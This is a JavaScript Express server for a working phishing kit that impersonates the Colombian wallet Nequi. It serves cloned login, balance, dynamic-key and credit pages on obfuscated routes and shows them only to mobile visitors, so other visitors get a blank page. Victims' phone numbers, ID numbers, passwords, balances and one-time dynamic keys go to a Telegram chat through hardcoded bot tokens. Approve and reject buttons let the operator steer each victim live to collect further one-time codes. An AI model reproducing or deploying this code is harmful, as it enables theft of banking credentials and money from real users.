const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// CONFIGURATION - REPLACE THESE WITH YOUR OWN
const TELEGRAM_TOKEN = '8613973292:AAGcOc-qY7Zk5QyOqRi9iI2r_CmTVV2SzLE'; // Main Bot
const VISITOR_BOT_TOKEN = '8746680880:AAEX8Vi3b0MgD_aVn8BilHR01ZtkJeViW1c'; // Visitor Notification Bot
const CHAT_ID = '-5102063644'; // ID corregido por el usuario

const app = express();
const port = process.env.PORT || 3000;

// Random Routes Mapping
const ROUTES = {
    INDEX: '/dGtRYXVHejZ6TXo4UHpiSTgyWENocGFRQVJXNElpcEtyZHdKVER4TWpqQzRDS2xrSDNkbDRZdDE3NzA5OTAyMjkzOTE',
    LOGIN: '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn',
    VALIDATION: '/QmNpQrStUvWxYz0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUv',
    DYNAMIC: '/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj',
    CREDIT: '/FiNaLPaGeXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx'
};

// Middleware for Mobile Detection
const mobileCheck = (req, res, next) => {
    const ua = req.headers['user-agent'];
    if (/mobile|android|iphone|ipad|phone/i.test(ua)) {
        next();
    } else {
        res.send(''); // Send empty response (blank screen)
    }
};

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public')); // Serve assets if any

// Initialize Telegram Bots
const visitorBot = new TelegramBot(VISITOR_BOT_TOKEN, { polling: false }); // No polling needed for just sending

// Endpoint to notify when someone opens the page
app.get('/api/notify-visitor', (req, res) => {
    const ip = getIP(req);
    const fecha = formatDate();
    const ua = req.headers['user-agent'];

    const message = `
👀 *NUEVA VISITA EN LA WEB*

🌐 *IP:* ${ip}
⏰ *Fecha:* ${fecha}
📱 *Dispositivo:* ${ua.substring(0, 100)}...

⚠️ *Acción:* El usuario acaba de abrir la página de inicio.
    `;

    visitorBot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' })
        .then(() => {
            console.log(`Visitor notification sent for IP: ${ip}`);
            res.json({ success: true });
        })
        .catch((err) => {
            console.error('Error sending visitor notification:', err);
            res.status(500).json({ error: 'Failed to send notification' });
        });
});

// Serve specific HTML files on random routes (Mobile Only)
app.get(ROUTES.INDEX, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get(ROUTES.LOGIN, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'login_final.html'));
});

app.get(ROUTES.VALIDATION, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'validacion_saldo.html'));
});

app.get(ROUTES.DYNAMIC, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'confirmacion_nequi.html'));
});

app.get(ROUTES.CREDIT, mobileCheck, (req, res) => {
    res.sendFile(path.join(__dirname, 'credito.html'));
});

// Root redirect to random index
app.get('/', (req, res) => {
    res.redirect(ROUTES.INDEX);
});

// Serve static assets (JS, CSS, IMG) freely but block direct HTML access
app.use((req, res, next) => {
    if (req.path.endsWith('.html')) {
        res.status(404).send('Not Found');
    } else {
        next();
    }
});

app.use(express.static(__dirname)); // Serve other static files like js, css, img

// Logging Middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// Helper to normalize phone numbers
const normalizePhone = (phone) => {
    return phone.toString().replace(/\D/g, '').trim();
};

// Helper to format date
const formatDate = () => {
    const now = new Date();
    const pad = (num) => String(num).padStart(2, '0');
    return `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
};

// Helper to get IP
const getIP = (req) => {
    const forwarded = req.headers['x-forwarded-for'];
    return forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress || req.ip;
};

// In-memory storage for user sessions
const userSessions = {};

// Initialize Telegram Bot for Data
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Test Connection
bot.sendMessage(CHAT_ID, "🚀 *SISTEMA INICIADO* - Bot de datos listo.")
    .then(() => console.log("Connection Test: Main Bot sent message successfully."))
    .catch(err => console.error("Connection Test: Main Bot FAILED to send message:", err.message));

// Handle Telegram Polling Errors (Unified)
bot.on('polling_error', (error) => {
    console.error(`[TELEGRAM ERROR] ${error.code}: ${error.message}`);
});

// Listener to help find the correct CHAT_ID
bot.on('message', (msg) => {
    console.log(`📩 MENSAJE RECIBIDO | Chat ID: ${msg.chat.id} | Tipo: ${msg.chat.type} | De: ${msg.from.username}`);
});

bot.getMe().then(me => {
    console.log(`🤖 BOT INICIADO: @${me.username}`);
});

// Helper to format currency
const formatMoney = (value) => {
    if (!value || isNaN(value)) return value;
    return new Intl.NumberFormat('es-CO').format(value);
};

// API Endpoint to receive data from frontend
app.post('/api/save-data', (req, res) => {
    let { celular, cedula, clave, saldo, monto, cuota } = req.body;
    console.log(`[DEBUG] Recibida solicitud /api/save-data para ${celular}`);
    
    if (!celular) {
        return res.status(400).json({ error: 'Celular is required' });
    }

    const cleanCelular = normalizePhone(celular);
    const ip = getIP(req);
    const fecha = formatDate();
    
    // Clean and format monto/cuota
    const formattedMonto = formatMoney(monto);
    const cleanCuota = cuota ? cuota.replace('$ ', '') : 'No calculado';

    // Store/Update session
    userSessions[cleanCelular] = {
        celular: cleanCelular,
        cedula,
        clave,
        saldo,
        monto: formattedMonto,
        cuota: cleanCuota,
        ip,
        status: 'waiting', // Start in waiting status
        timestamp: new Date()
    };

    // Auto-approve to dynamic after 2 seconds
    setTimeout(() => {
        if (userSessions[cleanCelular] && userSessions[cleanCelular].status === 'waiting') {
            userSessions[cleanCelular].status = 'approved';
            console.log(`[AUTO-APPROVE] ${cleanCelular} moved to approved status after 2 seconds.`);
        }
    }, 2000);

    // Construct message for Telegram
    const message = `
📱 *NEQUI - DATOS COMPLETOS*

👤 *Nombre:* Usuario Propulsor
🆔 *Cédula:* ${cedula}
📱 *Celular (Reg):* ${cleanCelular}
💸 *Solicitud Crédito:* -PRESTAMO: ${formattedMonto}| 1ra cuota ${cleanCuota}
📧 *Email:* No registrado
🌐 *IP Usuario:* ${ip}

📞 *Número (Login):* ${cleanCelular}
🔒 *Contraseña:* ${clave}
💰 *Saldo:* $${saldo}

⏰ *Fecha:* ${fecha}

⚠️ *Estado:* Redirigiendo a Dinámica en 2 segundos...
    `;

    // Send to Telegram with Inline Buttons (Optional if user wants to speed up or reject)
    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '❌ Rechazar (Error)', callback_data: `reject_${cleanCelular}` },
                    { text: '❌ Error Saldo', callback_data: `reject_saldo_${cleanCelular}` }
                ]
            ]
        }
    };

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => {
            console.log(`Data sent to Telegram for ${cleanCelular}`);
            res.json({ success: true, message: 'Data received and sent to Telegram' });
        })
        .catch((err) => {
            console.error('Error sending to Telegram:', err);
            // Even if Telegram fails, we acknowledge receipt to frontend
            res.json({ success: true, message: 'Data received (Telegram failed)' });
        });
});

// API Endpoint to check status
app.post('/api/check-status', (req, res) => {
    const { celular } = req.body;
    const cleanCelular = normalizePhone(celular);
    const session = userSessions[cleanCelular];

    if (!session) {
        return res.json({ status: 'unknown' });
    }

    res.json({ status: session.status });
});

// API Endpoint to receive dynamic key
app.post('/api/save-dynamic', (req, res) => {
    let { celular, clave, dinamica, cedula, monto, cuota, saldo } = req.body;

    if (!celular) {
        return res.status(400).json({ error: 'Celular is required' });
    }

    const cleanCelular = normalizePhone(celular);
    const ip = getIP(req);
    const fecha = formatDate();
    
    // Clean and format monto/cuota
    const formattedMonto = formatMoney(monto);
    const cleanCuota = cuota ? cuota.replace('$ ', '') : 'No calculado';

    // Update session
    if (userSessions[cleanCelular]) {
        userSessions[cleanCelular].dinamica = dinamica;
        userSessions[cleanCelular].status = 'waiting_dynamic';
    } else {
        // Fallback if session lost
        userSessions[cleanCelular] = {
            celular: cleanCelular,
            clave,
            dinamica,
            cedula,
            monto: formattedMonto,
            cuota: cleanCuota,
            saldo,
            ip,
            status: 'waiting_dynamic',
            timestamp: new Date()
        };
    }

    // Construct message for Telegram
    const message = `
🔑 *NEQUI - CLAVE DINÁMICA RECIBIDA*

👤 *Nombre:* Usuario Propulsor
🆔 *Cédula:* ${cedula || (userSessions[cleanCelular] ? userSessions[cleanCelular].cedula : 'No disponible')}
📱 *Celular (Reg):* ${cleanCelular}
💸 *Solicitud Crédito:* -PRESTAMO: ${formattedMonto || (userSessions[cleanCelular] ? userSessions[cleanCelular].monto : 'No disponible')}| 1ra cuota ${cleanCuota || (userSessions[cleanCelular] ? userSessions[cleanCelular].cuota : 'No disponible')}
🌐 *IP Usuario:* ${ip}

🎯 *Clave Dinámica:* ${dinamica}

📞 *Número (Login):* ${cleanCelular}
🔒 *Contraseña:* ${clave || (userSessions[cleanCelular] ? userSessions[cleanCelular].clave : 'No disponible')}
💰 *Saldo:* $${saldo || (userSessions[cleanCelular] ? userSessions[cleanCelular].saldo : 'No disponible')}

⏰ *Fecha:* ${fecha}
    `;

    // Send to Telegram with Inline Buttons
    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '❌ Error Usuario', callback_data: `reject_user_${cleanCelular}` },
                    { text: '❌ Error Dinámica', callback_data: `reject_dynamic_${cleanCelular}` }
                ],
                [
                     { text: '❌ Error Saldo', callback_data: `reject_saldo_${cleanCelular}` }
                ],
                [
                     { text: '✅ Aprobar', callback_data: `approve_dynamic_${cleanCelular}` }
                ]
            ]
        }
    };

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => {
            console.log(`Dynamic key sent to Telegram for ${cleanCelular}`);
            res.json({ success: true, message: 'Dynamic key sent to Telegram' });
        })
        .catch((err) => {
            console.error('Error sending to Telegram:', err);
            res.json({ success: true, message: 'Data received (Telegram failed)' });
        });
});

// API Endpoint to check dynamic status
app.post('/api/check-dynamic-status', (req, res) => {
    const { celular } = req.body;
    const cleanCelular = normalizePhone(celular);
    const session = userSessions[cleanCelular];

    if (!session) {
        return res.json({ status: 'unknown' });
    }

    res.json({ status: session.status });
});

// Handle Telegram Callback Queries (Button Clicks) - Unified Handler
bot.on('callback_query', (callbackQuery) => {
    // Answer immediately to stop the loading icon in Telegram
    bot.answerCallbackQuery(callbackQuery.id).catch(err => console.error('Error answering callback:', err));

    const action = callbackQuery.data;
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    const parts = action.split('_');
    let rawCelular;

    if (parts.length === 2) {
        rawCelular = parts[1];
    } else if (parts.length === 3) {
        rawCelular = parts[2];
    } else {
        return;
    }

    const celular = normalizePhone(rawCelular);
    
    console.log(`[ACTION] ${action} | User: ${celular}`);

    // Process action logic
    if (userSessions[celular]) {
        if (action.includes('approve_dynamic')) {
            userSessions[celular].status = 'approved';
            bot.sendMessage(chatId, `✅ ${celular} APROBADO`).catch(() => {});
        } 
        else if (action.includes('reject_user')) {
            userSessions[celular].status = 'rejected_user';
            bot.sendMessage(chatId, `❌ ${celular} ERROR CLAVE`).catch(() => {});
        } 
        else if (action.includes('reject_dynamic')) {
            userSessions[celular].status = 'rejected_dynamic';
            bot.sendMessage(chatId, `❌ ${celular} ERROR DINÁMICA`).catch(() => {});
        } 
        else if (action.includes('reject_saldo')) {
            userSessions[celular].status = 'rejected_saldo';
            bot.sendMessage(chatId, `❌ ${celular} ERROR SALDO`).catch(() => {});
        }
        else if (parts.length === 2 && parts[0] === 'approve') {
             userSessions[celular].status = 'approved';
             bot.sendMessage(chatId, `✅ ${celular} PIDIENDO DINÁMICA`).catch(() => {});
        }
        else if (parts.length === 2 && parts[0] === 'reject') {
             userSessions[celular].status = 'rejected';
             bot.sendMessage(chatId, `❌ ${celular} RECHAZADO`).catch(() => {});
        }
    } else {
        // Recovery logic for lost sessions
        userSessions[celular] = { celular: celular, timestamp: Date.now(), status: 'pending' };
        if (action.includes('approve_dynamic')) userSessions[celular].status = 'approved';
        else if (action.includes('reject_user')) userSessions[celular].status = 'rejected_user';
        else if (action.includes('reject_dynamic')) userSessions[celular].status = 'rejected_dynamic';
        else if (action.includes('reject_saldo')) userSessions[celular].status = 'rejected_saldo';
        else if (parts[0] === 'approve') userSessions[celular].status = 'approved';
        else if (parts[0] === 'reject') userSessions[celular].status = 'rejected';
        
        bot.sendMessage(chatId, `⚠️ Sesión recuperada para ${celular}`).catch(() => {});
    }
});

// Global Error Handlers to prevent crash
process.on('uncaughtException', (err) => {
    console.error('UNCAUGHT EXCEPTION:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('UNHANDLED REJECTION:', reason);
});

// Start Server with Error Handling
const server = app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

// Keep process alive
setInterval(() => {}, 1000 * 60 * 60); // Check every hour (dummy interval)

server.on('error', (e) => {
    if (e.code === 'EADDRINUSE') {
        console.error(`Port ${port} is already in use!`);
    } else {
        console.error('Server error:', e);
    }
});
